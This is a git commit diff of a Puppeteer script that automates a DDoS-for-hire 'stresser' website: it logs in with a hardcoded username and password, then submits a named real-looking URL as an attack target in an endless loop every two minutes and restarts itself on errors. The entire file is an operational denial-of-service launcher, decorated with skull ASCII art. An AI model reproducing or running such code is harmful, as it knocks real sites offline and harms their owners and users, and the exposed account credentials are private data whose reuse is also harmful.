2a76a89d6ab5b48d0f0234da6bbf23c241c397a2
jhonatanaraujo1 <jhonatan.araujo1@Hotmail.com>
2022-08-30 11:16:45 +0100

    ajusting

--- crawlerCryptoStresser/Login/login.js
+++ crawlerCryptoStresser/Login/login.js
@@ -1,50 +1,92 @@
 const puppeteer = require('puppeteer')
 
 try {
-    (async () => {
-        const browser = await puppeteer.launch({headless: true})
-        const page = await browser.newPage()
-        console.log('INICIO CRAWLER');
-        await page.setViewport({width: 1280, height: 800})
-        await page.goto('https://cryptostresser.com/login', {waitUntil: 'networkidle2'})
-        //buscando seletor do userName
-        await page.waitForSelector("[name='username']")
-        await page.type("[name='username']", "derrubamongol")
+    console.log("\n" +
+        "// ████▀░░░░░░░░░░░░░░░░░▀████\n" +
+        "// ███│░░░░░░░░░░░░░░░░░░░│███\n" +
+        "// ██▌│░░░░░░░░░░░░░░░░░░░│▐██\n" +
+        "// ██░└┐░░░░░░░░░░░░░░░░░┌┘░██\n" +
+        "// ██░░└┐░░░░░░░░░░░░░░░┌┘░░██\n" +
+        "// ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██\n" +
+        "// ██▌░│██████▌░░░▐██████│░▐██\n" +
+        "// ███░│▐███▀▀░░▄░░▀▀███▌│░███\n" +
+        "// ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██\n" +
+        "// ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██\n" +
+        "// ████▄─┘██▌░░░░░░░▐██└─▄████\n" +
+        "// █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████\n" +
+        "// ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████\n" +
+        "// █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████\n" +
+        "// ███████▄░░░░░░░░░░░▄██████\n")
+    attack()
+} catch (err) {
+    console.error(err)
+    attack()
+}
 
-        //Usando tab para colocar senha
-        await page.keyboard.down('Tab')
-        await page.keyboard.type("europonto3255@@")
-        //Clicando no Enter
-        await page.keyboard.press('Enter')
+function attack() {
 
-        console.log('STARTING ATTACK');
-        //ATTACK INFINITO
-        while (true == true) {
-            await page.goto('https://cryptostresser.com/attack?page=1', {waitUntil: 'networkidle2'})
-            await page.waitForSelector("[id='attack_target']")
+    try {
+        (async () => {
+            const browser = await puppeteer.launch({headless: true})
+            const page = await browser.newPage()
+            console.log('STARTED CODE DDOS ATTACK');
+            await page.setViewport({width: 1280, height: 800})
+            await page.goto('https://cryptostresser.com/login', {waitUntil: 'networkidle2'})
+            //buscando seletor do userName
+            await page.waitForSelector("[name='username']")
+            await page.type("[name='username']", "derrubamongol")
 
-            while (await page.$eval('#running_attack_count', element => element.innerHTML) == 1) {
-            console.log('DENTRO DO WHILE DO REDIRECIONAMENTO E ESPERANDO 1.5MIN');
-                await sleep(102000)
+            //Usando tab para colocar senha
+            await page.keyboard.down('Tab')
+            await page.keyboard.type("europonto3255@@")
+            //Clicando no Enter
+            await page.keyboard.press('Enter')
+
+            console.log('STARTING ATTACK');
+            //ATTACK INFINITO
+            while (true == true) {
                 await page.goto('https://cryptostresser.com/attack?page=1', {waitUntil: 'networkidle2'})
                 await page.waitForSelector("[id='attack_target']")
 
+                while (await page.$eval('#running_attack_count', element => element.innerHTML) == 1) {
+                    console.log('CHECKING IF CAN ATTACK AGAIN');
+                    await sleep(102000)
+                    await page.goto('https://cryptostresser.com/attack?page=1', {waitUntil: 'networkidle2'})
+                    await page.waitForSelector("[id='attack_target']")
+
+                }
+                console.log('!!!!!!!!! ATTACKING TARGET !!!!!!!');
+                await page.type("[id='attack_target']", "https://vejaagora8.tech/perfil48/")
+                await page.keyboard.press('Enter')
+                await page.keyboard.press('Escape')
+                console.log('WAITING WHILE ATTACK IS IN PROGRESSING');
+                await sleep(120000)
             }
-
-            await page.type("[id='attack_target']", "https://vejaagora7.tech/presell38/")
-            await page.keyboard.press('Enter')
-            await page.keyboard.press('Escape')
-
-            console.log('ESPERANDO PROXIMO LACO DO WHILE PRINCIPAL');
-            await sleep(120000)
-        }
-
-        await browser.close()
-    })()
-} catch (err) {
-    console.error(err)
+            await browser.close()
+        })()
+    } catch (err) {
+        console.error(err)
+        attack()
+    }
 }
 
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
+
+
+// ████▀░░░░░░░░░░░░░░░░░▀████
+// ███│░░░░░░░░░░░░░░░░░░░│███
+// ██▌│░░░░░░░░░░░░░░░░░░░│▐██
+// ██░└┐░░░░░░░░░░░░░░░░░┌┘░██
+// ██░░└┐░░░░░░░░░░░░░░░┌┘░░██
+// ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
+// ██▌░│██████▌░░░▐██████│░▐██
+// ███░│▐███▀▀░░▄░░▀▀███▌│░███
+// ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
+// ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
+// ████▄─┘██▌░░░░░░░▐██└─▄████
+// █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
+// ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
+// █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
+// ███████▄░░░░░░░░░░░▄██████
